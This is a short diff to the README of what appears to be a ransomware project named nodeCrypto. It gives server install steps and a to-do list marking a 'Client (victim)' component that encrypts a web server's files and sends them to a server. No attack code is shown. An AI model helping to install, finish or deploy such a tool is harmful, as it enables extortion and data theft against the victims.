@@ -15,11 +15,10 @@ The files at the root of the web server will encrypt and send to the server.
 **Install server**  
 Upload all file of server/ folder  on your webserver.
 Create a sql database and import sql/nodeCrypto.sql.
-Edit server/
+Edit server/libs/db.php and add your SQL ID
 
 
 **To Do**  
-
  - [x] Client (victim)
 	 - [x] Encrypt webserver
 	 - [x] Use private key for encryption
